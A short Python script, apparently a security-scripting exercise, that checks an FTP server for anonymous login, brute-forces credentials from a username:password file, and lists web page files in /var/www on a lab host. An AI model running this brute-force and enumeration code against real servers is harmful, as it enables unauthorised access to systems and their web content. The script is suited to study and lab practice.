# We can utilize the ftplib library in Python in order to build a small script to determine if a server offers anonymous logins.
# we will use anoLogin() takes in arg (hostname) and returns bool that describes the availability of anonymous logins

import ftplib

# checking the anonymous logins
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print("[+] FTP Anonymous Login Succeeded")
        ftp.quit()
        return True
    except Exception as e:
        print("[-] FTP Anonymous Login Failed")
        return False


# takes in a username and password
# attempts to login to the FTP server
# returns a typle of a username and password if success
# if fails return the error

# brute Force FTP User Credentials
def bruteLogin(hostname, passwdFile):
    # open the password File
    pF = open(passwdFile, 'r')
    # getting the usernames and password
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(":")[1].strip('\r').strip('\n')
        print(f"[+] Attempting {username}:{password}")

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print(f"[+] FTP Login Succeeded: {username}:{password}")
            ftp.quit()
            return(username, password)
        except:
            pass
    print("FTP Login Failed")
    return(None, None)


# takes an FTP connection as the input and returns an array of default pages it finds.
def returnDefault(ftp):
    print(f"[+] Analyzing a vulnerable FTP server")
    try:
        ftp.cwd('/var/www')
        # nlst lists the directory content
        # nlst checks each file returned by the nlst agaisnt default web page file names
        dirList = ftp.nlst()
        print(f'[!] Found: {dirList}')
    except:
        dirList = []
        print('[-] Could not list directory contents')
        print('[-] Skipping to the Next target')
        return

    # lists to be retunre {key: value for key, value in variable}
    retList = []

    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.html' in fn or '.asp' in fn:
            print(f"[+] Found default page: {fileName}")
            retList.append(fileName)
    return retList



host = '192.168.52.128'
username, password = bruteLogin(host, 'userpass.txt')
ftp = ftplib.FTP(host)
ftp.login(username, password)
returnDefault(ftp)
